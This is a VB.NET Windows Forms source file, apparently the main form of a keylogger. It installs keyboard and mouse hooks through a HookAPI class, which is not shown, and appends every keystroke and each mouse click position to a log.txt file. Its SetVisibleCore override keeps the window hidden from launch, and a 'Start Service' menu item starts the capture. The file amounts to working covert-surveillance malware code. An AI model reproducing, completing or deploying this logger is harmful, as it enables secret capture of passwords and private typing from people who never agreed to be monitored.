Imports System.ComponentModel
Imports System.IO.File
Imports System.IO
Imports System.IO.Compression
Imports System.Data.OleDb
Imports System.Runtime.InteropServices

Public Class Form1
    Dim x As HookAPI
    Dim oldChar As String = ""

#Region "Helper Functions"
    Private Sub ResetProgressBar(ByVal MaxVal As Integer, ByVal Optional Status As String = "Idle")
        ProgressBar1.Maximum = MaxVal
        ProgressBar1.Minimum = 0
        ProgressBar1.Value = 0
        StatusToolStripMenuItem.Text = "Status: " & Status
    End Sub
    Private Sub AdvProgressBar(ByVal Optional Template As String = "Status: Step {1} of {2} ( {3}% )")
        Dim TotalSteps As Double = ProgressBar1.Maximum
        Dim CurrentStep As Double = ProgressBar1.Value
        Dim ProgPercent As Double = (Int(1000 * (CurrentStep / TotalSteps)) / 10)
        Dim TempStr As String = Template

        If Not Template = "" Then TempStr = Template
        TempStr = TempStr.Replace("{1}", CurrentStep)
        TempStr = TempStr.Replace("{2}", TotalSteps)
        TempStr = TempStr.Replace("{3}", ProgPercent)

        StatusToolStripMenuItem.Text = TempStr
        If ProgressBar1.Value + 1 <= ProgressBar1.Maximum Then ProgressBar1.Value += 1
        Application.DoEvents()
    End Sub
    Private Sub Sleep(ByVal Waitms As Double)
        Dim Index As Double

        For Index = 0 To Int(Waitms / 10)
            Application.DoEvents()
            Threading.Thread.Sleep(10)
        Next
    End Sub
#End Region

    Private Sub updateTXT(ByVal newCHR As String)
        If x.isKeyboardHooked And Not newCHR = "" Then
            Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\log.txt", True)
            objWriter.Write(newCHR)
            objWriter.Close()
            oldChar = newCHR
        End If
        If x.isMouseHooked And newCHR = "" Then 'if hook mouse then
            If x.m_LB Or x.m_RB Or x.m_MB Then
                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\log.txt", True)
                objWriter.Write("Mouse:(" & x.m_X & "," & x.m_Y & ") B:(" & x.m_LB & "," & x.m_MB & "," & x.m_RB & ") W:" & x.m_Wheel & vbNewLine)
                objWriter.Close()
            End If
            AdvProgressBar("(" & x.m_X & "," & x.m_Y & "),(" & x.m_LB & "," & x.m_MB & "," & x.m_RB & "), W=" & x.m_Wheel & "")
        End If
    End Sub

    Protected Overrides Sub SetVisibleCore(ByVal value As Boolean)
        If Not Me.IsHandleCreated Then
            Me.CreateHandle()
            value = False
        End If
        MyBase.SetVisibleCore(value)

        ResetProgressBar(100)
        'Other Initiating commands
    End Sub
    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        x.UnHook()
        Application.Exit()
    End Sub
    Private Sub ExitServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitServiceToolStripMenuItem.Click
        Application.Exit()
    End Sub
    Private Sub StartServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartServiceToolStripMenuItem.Click
        If StartServiceToolStripMenuItem.Checked Then
            x = New HookAPI(AddressOf updateTXT)
            x.HookMouse()
            x.HookKeyboard()
        Else
            x.UnHook()
            ResetProgressBar(100)
        End If
    End Sub

End Class
